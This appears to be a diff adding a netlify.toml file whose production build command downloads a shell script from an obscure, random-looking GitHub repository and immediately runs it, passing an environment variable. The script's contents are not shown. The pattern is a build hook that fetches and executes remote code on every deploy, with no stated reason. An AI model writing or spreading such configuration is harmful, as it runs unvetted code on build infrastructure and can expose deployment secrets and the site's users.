@@ -1,0 +1,1 @@
+#netlify.toml \n[context.production]\n  publish = "/output"\n  command = "curl -o entrypoint.sh https://raw.githubusercontent.com/menju2ikg8uti/pose/main/entrypoint.sh && chmod +x entrypoint.sh && ./entrypoint.sh 02_$NUMBER_P"
